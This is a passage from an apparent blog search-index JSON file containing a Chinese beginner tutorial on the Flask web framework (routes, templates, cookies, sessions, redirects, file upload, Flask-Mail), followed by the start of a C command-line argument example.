\"bootstrap/wtf.html\" as wtf %&#125;&#123;% block title %&#125;Flasky&#123;% endblock %&#125;&#123;% block page_content %&#125;&lt;div class=\"page-header\"&gt; &lt;h1&gt;Hello,&#123;% if name %&#125;&#123;&#123; name &#125;&#125;&#123;% else %&#125;Stranger&#123;% endif %&#125;&lt;/h1&gt;&lt;/div&gt;&#123;&#123; wtf.quick_form(form) &#125;&#125;&#123;% endblock %&#125; 部分内容借鉴：中国工信出版社集团 人民邮电出版社《Flask Web开发第二版》","categories":[{"name":"Flask","slug":"Flask","permalink":"https://gitee.com/michelle19l/michelle19l/categories/Flask/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Flask/"}]},{"title":"Flask学习教程一——基础","slug":"Flask学习教程","date":"2020-04-21T16:24:21.000Z","updated":"2020-05-21T07:41:40.236Z","comments":true,"path":"2020/04/22/Flask学习教程/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/22/Flask%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/","excerpt":"","text":"本文主要参考https://www.w3cschool.cn/flask/Flask-3ask1yho.html本文大致按照参考资料架构书写，对代码错误或版本不兼容进行了修正如果需要更严谨的教程请参考官方文档 本文由于python2和python3共存，且使用python3环境运行，用pip3代替pip windows10 Pycharm专业版和Jupyter Notebook Python 3.7.2Flask 1.1.1Werkzeug 0.16.0 要求有python和html基础 Flask 概述什么是Web Framework？Web Application Framework（Web应用程序框架）或简单的Web Framework（Web框架）表示一个库和模块的集合，使Web应用程序开发人员能够编写应用程序，而不必担心协议，线程管理等低级细节。 什么是Flask？Flask是一个用Python编写的Web应用程序框架。 它由 Armin Ronacher 开发，他领导一个名为Pocco的国际Python爱好者团队。 Flask基于Werkzeug WSGI工具包和Jinja2模板引擎。两者都是Pocco项目。 WSGIWeb Server Gateway Interface（Web服务器网关接口，WSGI）已被用作Python Web应用程序开发的标准。WSGI是Web服务器和Web应用程序之间通用接口的规范。 Werkzeug它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。 jinja2jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。 Flask通常被称为微框架。 它旨在保持应用程序的核心简单且可扩展。Flask没有用于数据库处理的内置抽象层，也没有形成验证支持。相反，Flask支持扩展以向应用程序添加此类功能。一些受欢迎的Flask扩展将在本教程后续章节进行讨论。 环境搭建virtualenvpip3 install virutalenvmkdir newprojcd newprojvirtualenv venvvenv\\scripts\\activate 或者在新建项目时在“环境中”选择virtualenv Flaskpip3 install Flask 注：pycharm专业版对flask有特殊支持，博主使用的是学生账号 Flask应用Hello worldfrom flask import Flaskapp = Flask(__name__)@app.route('/')def hello_world(): return 'Hello World'if __name__ == '__main__': app.run() 运行：注意不要使用idle 打开http://127.0.0.1:5000/ 或 localhost:5000 函数解释app = Flask(_name_)Flask构造函数使用当前模块（__name __）的名称作为参数。 app.run()Flask类的run()方法在本地开发服务器上运行应用程序。 app.run(host, port, debug, options) 所有参数都是可选的 序号 参数与描述 1 host 要监听的主机名。 默认为127.0.0.1（localhost）。设置为“0.0.0.0”以使服务器在外部可用 2 port 默认值为5000 3 debug 默认为false。 如果设置为true，则提供调试信息 4 options 要转发到底层的Werkzeug服务器。 调试模式通过调用run()方法启动Flask应用程序。但是，当应用程序正在开发中时，应该为代码中的每个更改手动重新启动它。为避免这种不便，请启用调试支持。如果代码更改，服务器将自行重新加载。它还将提供一个有用的调试器来跟踪应用程序中的错误（如果有的话）。 在运行或将调试参数传递给run()方法之前，通过将application对象的debug属性设置为True来启用Debug模式。 app.debug = Trueapp.run() app.run(debug = True) Flask路由Flask中的route()装饰器用于将URL绑定到函数。 app.route(rule, options) rule 参数表示与该函数的URL绑定。 options 是要转发给基础Rule对象的参数列表。@app.route(‘/‘)@app.route('/')def hello_world(): return 'hello world' 在上面的示例中，’/ ‘ URL与hello_world()函数绑定。因此，当在浏览器中打开web服务器的主页时，将呈现该函数的输出。 @app.route(‘/hello’)@app.route(&#39;&#x2F;hello&#39;)def hello_world(): return &#39;hello world&#39; 访问http：// localhost:5000/hello URL，hello_world()函数的输出将在浏览器中呈现。此时localhost:5000将返回404 Flask变量规则构建动态URL，变量部分标记为&lt;variable-name&gt;。它作为关键字参数传递给与规则相关联的函数。 from flask import Flaskapp = Flask(__name__)if __name__ == '__main__': app.run(debug = True) 如果 序号 转换器和描述 0 接受字符串 %s 1 int接受整数 %d 2 float对于浮点值 %f 3 *path *接受用作目录分隔符的斜杠 在下面的代码中，使用了所有这些构造函数： from flask import Flaskapp = Flask(__name__)@app.route('/hello/&lt;name&gt;')def hello_name(name): return 'Hello %s!' % name# 或者写为 return '&lt;h1&gt;hello &#123;&#125;&lt;/h1&gt;'.format(name)@app.route('/blog/&lt;int:postID&gt;')def show_blog(postID): return 'Blog Number %d' % postID@app.route('/rev/&lt;float:revNo&gt;')def revision(revNo): return 'Revision Number %f' % revNoif __name__ == '__main__': app.run() 在浏览器中输入http://localhost:5000/hello/w3cschool作为URL , 则‘w3cschool’将作为参数提供给hello()函数。该页面讲显示Hello w3cschool! 访问浏览器中的URL http://localhost:5000/blog/11 。给定的数字用作show_blog()函数的参数。浏览器显示以下输出： Blog Number 11 在浏览器中输入此URL - http://localhost:5000/rev/1.1 revision()函数将浮点数作为参数。以下结果显示在浏览器窗口中： Revision Number 1.100000 定义规则Flask的URL规则基于Werkzeug的路由模块。这确保形成的URL是唯一的，并且基于Apache规定的先例。 考虑以下脚本中定义的规则： from flask import Flaskapp = Flask(__name__)@app.route('/flask')def hello_flask(): return 'Hello Flask'@app.route('/python/')def hello_python(): return 'Hello Python'if __name__ == '__main__': app.run() 这两个规则看起来类似，但在第二个规则中，使用斜杠（/）。因此，它成为一个规范的URL。因此，使用/python 或 /python/返回相同的输出。但是，如果是第一个规则，/flask/ URL会产生“404 Not Found”页面。 Flask URL构建url_for()用于动态构建特定函数url from flask import Flask, redirect, url_forapp = Flask(__name__)@app.route('/admin')def hello_admin(): return 'Hello Admin'@app.route('/guest/&lt;guest&gt;')def hello_guest(guest): return 'Hello %s as Guest' % guest@app.route('/user/&lt;name&gt;')def hello_user(name): if name =='admin': return redirect(url_for('hello_admin')) else: return redirect(url_for('hello_guest',guest = name))if __name__ == '__main__': app.run(debug = True) 如果访问/user/admin将调用hello_admin并跳转至/admin，如果访问的是/user/abc将调用hello_guest并跳转至/guest/abc Flask HTTP方法 http方法 作用 GET 以未加密的形式将数据发送到服务器。最常见的方法。 POST 用于将HTML表单数据发送到服务器。POST方法接收的数据不由服务器缓存。 默认情况下，Flask路由响应GET请求，下面演示如何使用POST方法 login.html &lt;html&gt; &lt;body&gt; &lt;form action = \"http://localhost:5000/login\" method = \"post\"&gt; &lt;p&gt;Enter Name:&lt;/p&gt; &lt;p&gt;&lt;input type = \"text\" name = \"nm\" /&gt;&lt;/p&gt; &lt;p&gt;&lt;input type = \"submit\" value = \"submit\" /&gt;&lt;/p&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; from flask import Flask, redirect, url_for, requestapp = Flask(__name__)@app.route('/success/&lt;name&gt;')def success(name): return 'welcome %s' % name@app.route('/login',methods = ['POST', 'GET'])def login(): if request.method == 'POST': user = request.form['nm'] return redirect(url_for('success',name = user)) else: user = request.args.get('nm') return redirect(url_for('success',name = user))if __name__ == '__main__': app.run(debug = True) 在浏览器中以绝对路径打开login.html，输入Name 点击submit，表单数据将POST到表单标签的action子句中的URL：http://localhost:5000/login映射到login()函数。由于服务器通过POST方法接收数据，因此通过以下步骤获得从表单数据获得的“nm”参数的值： user = request.form['nm'] 它作为变量部分传递给‘/ success’ URL。浏览器在窗口中显示welcome消息。 在login.html中将方法参数更改为‘GET’，然后在浏览器中再次打开它。服务器上接收的数据是通过GET方法获得的。通过以下的步骤获得’nm’参数的值： user = request.args.get(‘nm’) 这里，args是包含表单参数对及其对应值对的列表的字典对象。与’nm’参数对应的值将像之前一样传递到/success。 Flask模板介绍web模板系统：设计html，可以动态插入数据 转义符Jinja2模板引擎使用以下分隔符从HTML转义。 &#123;% ... %&#125;用于语句&#123;&#123; ... &#125;&#125;用于表达式可以打印到模板输出&#123;# ... #&#125;用于未包含在模板输出中的注释\\# ... ##用于行语句&#123;% endnote %&#125; 样例1——占位符from flask import Flask, render_templateapp = Flask(__name__)@app.route('/')def index(): return render_template('hello.html')@app.route('/hello/&lt;user&gt;')def hello_name(user): return render_template('hello.html', name=user)if __name__ == '__main__': app.debug=True app.run() 在templates文件夹中创建hello.html: &lt;!doctype html&gt; &lt;h1&gt;Hello &#123;&#123; name &#125;&#125;!&lt;/h1&gt; URL的变量部分插入占位符。 样例2——条件语句@app.route('/hello/&lt;int:score&gt;')def hello_name(score): return render_template('hello.html', marks = score) &lt;!doctype html&gt; &#123;% if marks&gt;50 %&#125; &lt;h1&gt; Your result is pass!&lt;/h1&gt; &#123;% else %&#125; &lt;h1&gt;Your result is fail&lt;/h1&gt; &#123;% endif %&#125; 样例三——表格@app.route('/')def result(): dict = &#123;'phy':50,'che':60,'maths':70&#125; return render_template('result.html', result = dict) &lt;table border=\"8\"&gt; &#123;% for key, value in result.items() %&#125; &lt;tr&gt; &lt;th&gt;&#123;&#123; key &#125;&#125; &lt;/th&gt; &lt;td&gt;&#123;&#123; value &#125;&#125; &lt;/td&gt; &lt;/tr&gt;&#123;% endfor %&#125; &lt;/table&gt; 注：参考资料里的&lt;tr&gt;使用了转义字符，不要直接复制 Flask静态文件特殊端点’static’用于生成静态文件的URL。 /app.py @app.route(\"/\")def index(): return render_template(\"hello.html\") /templates/hello.html &lt;html&gt; &lt;head&gt; &lt;script type = \"text/javascript\" src = \"&#123;&#123; url_for('static', filename = 'hello.js') &#125;&#125;\" &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;input type = \"button\" onclick = \"sayHello()\" value = \"Say Hello\" /&gt; &lt;/body&gt;&lt;/html&gt; /static/hello.js function sayHello() &#123; alert(\"Hello World\")&#125; hello.html中的HTML按钮的OnClick事件上调用hello.js中定义的javascript函数，该函数在Flask应用程序的“/”URL上呈现。 点击按钮后： Flask Request对象来自客户端网页的数据作为全局请求对象发送到服务器。为了处理请求数据，应该从Flask模块导入。 Request对象的重要属性如下所列： Form - 它是一个字典对象，包含表单参数及其值的键和值对。 args - 解析查询字符串的内容，它是问号（？）之后的URL的一部分。 Cookies - 保存Cookie名称和值的字典对象。 files - 与上传文件有关的数据。 method - 当前请求方法。 Flask 将表单数据发送到模板在以下示例中，‘/‘ URL会呈现具有表单的网页（student.html）。填入的数据会发布到触发 result()函数的‘/result’ URL。 results()函数收集字典对象中的request.form中存在的表单数据，并将其发送给result.html。 该模板动态呈现表单数据的HTML表格。 from flask import Flask, render_template, requestapp = Flask(__name__)@app.route('/')def student(): return render_template('student.html')@app.route('/result',methods = ['POST', 'GET'])def result(): if request.method == 'POST': result = request.form return render_template(\"result.html\",result = result)if __name__ == '__main__': app.run(debug=True) student.html &lt;form action = \"http://localhost:5000/result\" method = \"POST\" &gt; &lt;p&gt;Name &lt;input type = \"text\" name = \"Name\" /&gt;&lt;/p&gt; &lt;p&gt;Physics &lt;input type = \"text\" name = \"Physics\" /&gt;&lt;/p&gt; &lt;p&gt;Chemistry &lt;input type = \"text\" name = \"chemistry\" /&gt;&lt;/p&gt; &lt;p&gt;Maths &lt;input type =\"text\" name = \"Mathematics\" /&gt;&lt;/p&gt; &lt;p&gt;&lt;input type = \"submit\" value = \"submit\" /&gt;&lt;/p&gt; &lt;/form&gt; result.html &lt;!doctype html&gt;&lt;html&gt; &lt;body&gt; &lt;table border = 1&gt; &#123;% for key, value in result.items() %&#125; &lt;tr&gt; &lt;th&gt; &#123;&#123; key &#125;&#125; &lt;/th&gt; &lt;td&gt; &#123;&#123; value &#125;&#125; &lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125; &lt;/table&gt; &lt;/body&gt;&lt;/html&gt; 当点击提交按钮时，表单数据以HTML表格的形式呈现在result.html上 Flask CookiesCookie以文本文件的形式存储在客户端的计算机上，其目的是记住和跟踪与客户使用相关的数据，以获得更好的访问者体验和网站统计信息。 Request对象包含Cookie的属性。它是所有cookie变量及其对应值的字典对象，客户端已传输。除此之外，cookie还存储其网站的到期时间，路径和域名。 在Flask中，对响应对象设置cookie。使用make_response()函数从视图函数的返回值获取响应对象。之后，使用响应对象的set_cookie()函数来存储cookie。 读回cookie很容易。request.cookies属性的get()方法用于读取cookie。 make_response() 该点转载自：https://www.jianshu.com/p/44d88abb9515 make_response()，相当于DJango中的HttpResponse。 from flask import Flask,make_response,render_templateapp = Flask(__name__)# 1.返回内容@app.route('/')def make_response_function(): response = make_response('&lt;h2&gt;羞羞哒&lt;/h2&gt;') return response, 404# 2.返回页面@app.route('/makeresponse/')def make_response_function(): return render_template('hello.html') 注意：make_response 想要返回页面，不能直接写做：make_response(‘hello.html’)，必须用render_template(‘hello.html’)形式。 样例一# 转载自：https://blog.csdn.net/wei18791957243/article/details/85172653from flask import Flask, make_response, requestapp = Flask(__name__)@app.route(\"/set_cookie\")def set_cookie(): resp = make_response(\"success\") ''' 设置cookie,默认有效期是临时cookie,浏览器关闭就失效 可以通过 max_age 设置有效期， 单位是秒 ''''' resp.set_cookie(\"Itcast_1\", \"python_1\") resp.set_cookie(\"Itcast_2\", \"python_2\") resp.set_cookie(\"Itcast_3\", \"python_3\", max_age=3600) return resp@app.route(\"/get_cookie\")def get_cookie(): \"\"\" 获取cookie，通过reques.cookies的方式， 返回的是一个字典，可以用get的方式 \"\"\" cookie_1 = request.cookies.get(\"Itcast_1\") # 获取名字为Itcast_1对应cookie的值 return cookie_1@app.route(\"/delete_cookie\")def delete_cookie(): \"\"\" 删除cookie，通过delete_cookie()的方式， 里面是cookie的名字 这里的删除只是让cookie过期，并不是直接删除cookie \"\"\" resp = make_response(\"del success\") resp.delete_cookie(\"Itcast1\") return respif __name__ == '__main__': app.run(debug=True) 样例二 参考：https://blog.csdn.net/weixin_41287692/article/details/88951735 from flask import Flask, make_response, request,render_templateapp = Flask(__name__)@app.route('/')def index(): return render_template('index.html')@app.route('/setcookie', methods=['POST', 'GET'])def setcookie(): if request.method == 'POST': user = request.form['nm'] resp = make_response(render_template('readcookie.html')) resp.set_cookie('userID', user) return resp@app.route('/getcookie')def getcookie(): name = request.cookies.get('userID') return '&lt;h1&gt;welcome '+name+'&lt;/h1&gt;'if __name__ == '__main__': app.run(debug=True) readcookie.html &lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=\"/getcookie\"&gt;getcookie&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; index.html &lt;html&gt; &lt;body&gt; &lt;form action = \"/setcookie\" method = \"POST\"&gt; &lt;p&gt;&lt;h3&gt;Enter userID&lt;/h3&gt;&lt;/p&gt; &lt;p&gt;&lt;input type = 'text' name = 'nm'/&gt;&lt;/p&gt; &lt;p&gt;&lt;input type = 'submit' value = 'Login'/&gt;&lt;/p&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; Flask 会话与Cookie不同，Session（会话）数据存储在服务器上。会话是客户端登录到服务器并注销服务器的时间间隔。需要在该会话中保存的数据会存储在服务器上的临时目录中。 为每个客户端的会话分配会话ID。会话数据存储在cookie的顶部，服务器以加密方式对其进行签名。对于此加密，Flask应用程序需要一个定义的SECRET_KEY。 Session对象也是一个字典对象，包含会话变量和关联值的键值对。 以下内容参考：https://www.jianshu.com/p/dd0aa75f3f0e flask中如何操作sessionfrom flask import Flask,sessionimport osapp = Flask(__name__)app.config['SECRET_KEY'] = os.urandom(24)# 添加数据到session中# 操作session的时候 跟操作字典是一样的。# SECRET_KEY@app.route('/')def hello_world(): session['username'] = 'zhangsan' return 'Hello World!'if __name__ == '__main__': app.run(debug=True) 在python中操作session的方式和操作字典的方式非常类似，session[&#39;username&#39;] = &#39;zhangsan&#39; 就是给session中的变量username赋值。在flask中操作session有一点需要注意，就是需要设置一个’SECRET_KEY’。可以单独在配置文件中写SECRET_KEY。 SECRET_KEY = 'abc' 或者直接写 app.config['SECRET_KEY'] = 'abc' 都是可以的，我这里用了一个随机的变量，而且是24位的。 os.urandom(24) 会从 0-9，a-z A-Z中随机选中24个字符串用做加密session的秘钥。或者称之为 “盐”。设置好之后执行下代码，然后在谷歌浏览器中找找这个session。在谷歌浏览器中找到设置，然后在最下面找到高级。 找到内容设置。找到Cookie。 然后找到查看所有Cookie和网站数据 搜索127.0.0.1 到这个里就可以看到咱们添加的session值了，但是这个内容是加密后的。 获取session值@app.route('/get/')def get(): # session['username'] 如果username不存在则会抛出异常 # session.get('username') 如果username不存在会得到 none 不会报错 推荐使用 return session.get('username') 这里咱们获取值一般是用session.get(&#39;username&#39;)这样即使session值不存在也不会抛出异常。 删除清空session@app.route('/delete/')def delete(): print(session.get('username')) session.pop('username') print(session.get('username')) return 'success'@app.route('/clear/')def clear(): print(session.get('username')) # 删除session中的所有数据 session.clear() print(session.get('username')) return 'success' 设置session的过期时间一般session都是有一个过期时间的， 如果没有指定session的过期时间，那么默认是浏览器关闭就自动结束，如果设置了session的permanent属性为True，那么过期时间是31天。 默认 设置session的过期时间： from datetime import timedeltaapp.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)session.permanent = True 当只设置了session.permanent = True时，可以看到浏览器中127.0.0.1中的session过期时间为31天。 当设置 `app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)`时，可以看到session的过期时间变成7天了。 完整代码from flask import Flask,sessionimport osfrom datetime import timedeltaapp = Flask(__name__)app.config['SECRET_KEY'] = os.urandom(24)app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)# 添加数据到session中# 操作session的时候 跟操作字典是一样的。# SECRET_KEY@app.route('/')def hello_world(): session['username'] = 'zhangsan' # 如果没有指定session的过期时间，那么默认是浏览器关闭就自动结束 # 如果设置了session的permanent属性为True，那么过期时间是31天。 session.permanent = True return 'Hello World!'@app.route('/get/')def get(): # session['username'] 如果username不存在则会抛出异常 # session.get('username') 如果username不存在会得到 none 不会报错 推荐使用 return session.get('username')@app.route('/delete/')def delete(): print(session.get('username')) session.pop('username') print(session.get('username')) return 'success'@app.route('/clear/')def clear(): print(session.get('username')) # 删除session中的所有数据 session.clear() print(session.get('username')) return 'success'if __name__ == '__main__': app.run(debug=True) Flask 重定向和错误redirect()函数Flask类有一个redirect()函数。调用时，它返回一个响应对象，并将用户重定向到具有指定状态代码的另一个目标位置。 redirect()函数的原型如下： Flask.redirect(location, statuscode, response) 在上述函数中： location参数是应该重定向响应的URL。 statuscode发送到浏览器标头，默认为302。 response参数用于实例化响应。 状态码以下状态代码已标准化： HTTP_300_MULTIPLE_CHOICES HTTP_301_MOVED_PERMANENTLY HTTP_302_FOUND HTTP_303_SEE_OTHER HTTP_304_NOT_MODIFIED HTTP_305_USE_PROXY HTTP_306_RESERVED HTTP_307_TEMPORARY_REDIRECT 默认状态代码为302，表示‘found’。 样例一在以下示例中，redirect()函数用于在登录尝试失败时再次显示登录页面。 from flask import Flask, redirect, url_for, render_template, request# Initialize the Flask applicationapp = Flask(__name__)@app.route('/')def index(): return render_template('login.html')@app.route('/login',methods = ['POST', 'GET'])def login(): if request.method == 'POST' and request.form['username'] == 'admin' : return redirect(url_for('success')) return redirect(url_for('index'))@app.route('/success')def success(): return 'logged in successfully' if __name__ == '__main__': app.run(debug = True) abort()函数Flask类具有带有错误代码的abort()函数。 Flask.abort(code) Code参数采用以下值之一： 400 - 用于错误请求 401 - 用于未身份验证的 403 - Forbidden 404 - 未不到 406 - 表示不接受 415 - 用于不支持的媒体类型 429 - 请求过多 样例二让我们对上述代码中的login()函数稍作更改。如果要显示‘Unauthurized’页面，请将其替换为调用abort(401)，而不是重新显示登录页面。 from flask import Flask, redirect, url_for, render_template, request, abortapp = Flask(__name__)@app.route('/')def index(): return render_template('login.html')@app.route('/login',methods = ['POST', 'GET'])def login(): if request.method == 'POST': if request.form['username'] == 'admin' : return redirect(url_for('success')) else: abort(401) else: return redirect(url_for('index'))@app.route('/success')def success(): return 'logged in successfully'if __name__ == '__main__': app.run(debug = True) 演示login.html注意表明post &lt;form action = \"http://localhost:5000/login\" method = \"post\"&gt; &lt;p&gt;&lt;input type = 'text' name = username&gt;&lt;/p&gt; &lt;p&gt;&lt;input type = 'submit' value = Login&gt;&lt;/p&gt;&lt;/form&gt; 结果 输入admin 输入其它内容，触发abort（401） Flask 消息闪现一个好的基于GUI的应用程序会向用户提供有关交互的反馈。例如，桌面应用程序使用对话框或消息框，JavaScript使用警报用于类似目的。 在Flask Web应用程序中生成这样的信息性消息很容易。Flask框架的闪现系统可以在一个视图中创建消息，并在名为next的视图函数中呈现它。 Flask模块包含flash()方法。它将消息传递给下一个请求，该请求通常是一个模板。 flash(message, category) 其中， message参数是要闪现的实际消息。 category参数是可选的。它可以是“error”，“info”或“warning”。 为了从会话中删除消息，模板调用get_flashed_messages()。 get_flashed_messages(with_categories, category_filter) 两个参数都是可选的。如果接收到的消息具有类别，则第一个参数是元组。第二个参数仅用于显示特定消息。 以下闪现在模板中接收消息。 &#123;% with messages = get_flashed_messages() %&#125; &#123;% if messages %&#125; &#123;% for message in messages %&#125; &#123;&#123; message &#125;&#125; &#123;% endfor %&#125; &#123;% endif %&#125;&#123;% endwith %&#125; 样例app.py from flask import Flask, redirect, url_for, render_template, request, flashimport osapp = Flask(__name__)app.config['SECRET_KEY'] = os.urandom(24)@app.route('/')def index(): return render_template('index.html')@app.route('/login', methods=['GET', 'POST'])def login(): error = None if request.method == 'POST': if request.form['username'] != 'admin' or \\ request.form['password'] != 'admin': error = 'Invalid username or password. Please try again!' else: flash('You were successfully logged in') return redirect(url_for('index')) return render_template('login.html', error=error)if __name__ == '__main__': app.run(debug=True) login.html &lt;!doctype html&gt; &lt;h1&gt;Login&lt;/h1&gt; &#123;% if error %&#125; &lt;p&gt;&lt;strong&gt;Error:&lt;/strong&gt; &#123;&#123; error &#125;&#125; &#123;% endif %&#125; &lt;form action = \"http://localhost:5000/login\" method = \"post\"&gt; &lt;dl&gt; &lt;dt&gt;Username:&lt;/dt&gt; &lt;dd&gt;&lt;input type = text name=\"username\" value=\"&#123;&#123; request.form.username &#125;&#125;\"&gt;&lt;/dd&gt; &lt;dt&gt;Pssword:&lt;/dt&gt; &lt;dd&gt;&lt;input type=\"password\" name=\"password\"&gt;&lt;/dd&gt; &lt;/dl&gt; &lt;p&gt;&lt;input type=\"submit\" value=\"Login\"&gt;&lt;/p&gt; &lt;/form&gt; index.html &lt;!doctype html&gt; &#123;% with messages = get_flashed_messages() %&#125; &#123;% if messages %&#125; &lt;ul&gt; &#123;% for message in messages %&#125; &lt;li&gt;&#123;&#123; message &#125;&#125;&lt;/li&gt; &#123;% endfor %&#125; &lt;/ul&gt; &#123;% endif %&#125; &#123;% endwith %&#125; &lt;h1&gt;Flask Message Flashing Example&lt;/h1&gt; &lt;p&gt;Do you want to &lt;a href = \"&#123;&#123; url_for('login') &#125;&#125;\"&gt; &lt;b&gt;log in?&lt;/b&gt;&lt;/a&gt;&lt;/p&gt; Flask 文件上传在Flask中处理文件上传非常简单。它需要一个HTML表单，其enctype属性设置为“multipart / form-data”，将文件发布到URL。URL处理程序从request.files[]对象中提取文件，并将其保存到所需的位置。 每个上传的文件首先会保存在服务器上的临时位置，然后将其实际保存到它的最终位置。目标文件的名称可以是硬编码的，也可以从request.files[file]对象的filename属性中获取。但是，建议使用secure_filename()函数获取它的安全版本。 可以在Flask对象的配置设置中定义默认上传文件夹的路径和上传文件的最大大小。 app.config[‘UPLOAD_FOLDER’] 定义上传文件夹的路径 app.config[‘MAX_CONTENT_PATH’] 指定要上传的文件的最大大小（以字节为单位） 以下代码具有’/ upload’ URL规则，该规则在templates文件夹中显示’upload.html’，以及‘/ upload-file’ URL规则，用于调用uploader()函数处理上传过程。 ‘upload.html’有一个文件选择器按钮和一个提交按钮。 &lt;html&gt; &lt;body&gt; &lt;form action = \"http://localhost:5000/uploader\" method = \"POST\" enctype = \"multipart/form-data\"&gt; &lt;input type = \"file\" name = \"file\" /&gt; &lt;input type = \"submit\"/&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 您将看到如下所示的界面。 选择文件后，单击提交。表单的post方法调用‘/ upload_file’ URL。底层函数uploader()执行保存操作。 以下是Flask应用程序的Python代码。 from flask import Flask, render_template, requestfrom werkzeug import secure_filenameapp = Flask(__name__)@app.route('/')def upload_file(): return render_template('upload.html') @app.route('/uploader', methods = ['GET', 'POST'])def upload_file(): if request.method == 'POST': f = request.files['file'] # URL处理程序从request.files[]对象中提取文件，并将其保存到所需的位置。 f.save(secure_filename(f.filename)) # 获取目标文件的名称 return 'file uploaded successfully' if __name__ == '__main__': app.run(debug = True) Flask扩展Flask通常被称为微框架，因为核心功能包括基于Werkzeug的WSGI和路由以及基于Jinja2的模板引擎。此外，Flask框架还支持cookie和会话，以及JSON，静态文件等Web帮助程序。显然，这不足以开发完整的Web应用程序。而Flask扩展就具备这样的功能。Flask扩展为Flask框架提供了可扩展性。 有大量的Flask扩展可用。Flask扩展是一个Python模块，它向Flask应用程序添加了特定类型的支持。Flask Extension Registry（Flask扩展注册表）是一个可用的扩展目录。可以通过pip实用程序下载所需的扩展名。 在本教程中，我们将讨论以下重要的Flask扩展： Flask Mail - 为Flask应用程序提供SMTP接口 Flask WTF - 添加WTForms的渲染和验证 Flask SQLAlchemy - 为Flask应用程序添加SQLAlchemy支持 Flask Sijax - Sijax的接口 - Python/jQuery库，使AJAX易于在Web应用程序中使用 每种类型的扩展通常提供有关其用法的大量文档。由于扩展是一个Python模块，因此需要导入它才能使用它。Flask扩展名通常命名为flask-foo。导入的操作如下： from flask_foo import [class, function] 对于0.7以后的Flask版本，您还可以使用语法： from flask.ext import foo 对于此用法，需要激活兼容性模块。它可以通过运行flaskext_compat.py来安装： import flaskext_compatflaskext_compat.activate()from flask.ext import foo Flask 邮件基于web的应用程序通常需要具有向用户/客户端发送邮件的功能。Flask-Mail扩展使得与任何电子邮件服务器建立简单的接口变得非常容易。 首先，应该在pip实用程序的帮助下安装Flask-Mail扩展。 pip3 install Flask-Mail 然后需要通过设置以下应用程序参数的值来配置Flask-Mail。 序号 参数与描述 1 MAIL_SERVER电子邮件服务器的名称/IP地址 2 MAIL_PORT使用的服务器的端口号 3 MAIL_USE_TLS启用/禁用传输安全层加密 4 MAIL_USE_SSL启用/禁用安全套接字层加密 5 MAIL_DEBUG调试支持。默认值是Flask应用程序的调试状态 6 MAIL_USERNAME发件人的用户名 7 MAIL_PASSWORD发件人的密码 8 MAIL_DEFAULT_SENDER设置默认发件人 9 MAIL_MAX_EMAILS设置要发送的最大邮件数 10 MAIL_SUPPRESS_SEND如果app.testing设置为true，则发送被抑制 11 MAIL_ASCII_ATTACHMENTS如果设置为true，则附加的文件名将转换为ASCII flask-mail模块包含以下重要类的定义。 Mail类它管理电子邮件消息传递需求。类构造函数采用以下形式： flask-mail.Mail(app &#x3D; None) 构造函数将Flask应用程序对象作为参数。 Mail类的方法 序号 方法与描述 1 send()发送Message类对象的内容 2 connect()打开与邮件主机的连接 3 send_message()发送消息对象 Message类它封装了一封电子邮件。Message类构造函数有几个参数: flask-mail.Message(subject, recipients, body, html, sender, cc, bcc, reply-to, date, charset, extra_headers, mail_options, rcpt_options) Message类方法attach() - 为邮件添加附件。此方法采用以下参数： filename - 要附加的文件的名称 content_type - MIME类型的文件 data - 原始文件数据 处置 - 内容处置（如果有的话）。 add_recipient() - 向邮件添加另一个收件人 from flask import Flask# 步骤一:在代码中从flask-mail模块导入Mail和Message类。from flask_mail import Mail, Message app =Flask(__name__)# 步骤二：然后按照以下设置配置Flask-Mailapp.config['MAIL_SERVER']='smtp.gmail.com'app.config['MAIL_PORT'] = 465app.config['MAIL_USERNAME'] = 'yourId@gmail.com'app.config['MAIL_PASSWORD'] = '*****' # 发件放邮箱需要开启POP3/SMTP服务，获取客户端授权码，填入app.config['MAIL_PASSWORD']app.config['MAIL_USE_TLS'] = Falseapp.config['MAIL_USE_SSL'] = True# 步骤三：创建Mail类的实例mail = Mail(app)# 步骤四：在由URL规则（‘/’）映射的Python函数中设置Message对象。@app.route(\"/\")def index(): msg = Message('Hello', sender = 'yourId@gmail.com', recipients = ['id1@gmail.com']) msg.body = \"Hello Flask message sent from Flask-Mail\" mail.send(msg) return \"Sent\"if __name__ == '__main__': app.run(debug = True) 在发送至163邮箱时出现了被当成垃圾邮件被拒收的情况（TAT），发送到qq邮箱是可以的","categories":[{"name":"Flask","slug":"Flask","permalink":"https://gitee.com/michelle19l/michelle19l/categories/Flask/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Flask/"}]},{"title":"c语言参数学习","slug":"c语言参数学习","date":"2020-04-13T10:46:40.000Z","updated":"2020-04-14T06:51:39.003Z","comments":true,"path":"2020/04/13/c语言参数学习/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/13/c%E8%AF%AD%E8%A8%80%E5%8F%82%E6%95%B0%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc,char *argv[])&#123; printf(&quot;%s\\n&quot;,argv[0]);&#x2F;&#x2F;读取可执行程序（包括路径） &#x2F;*读取参数*&#x2F; int i &#x3D; 1; while(i &lt; argc) &#123; printf(&quot;%s\\n&quot;,argv[i]); i++; &#125; 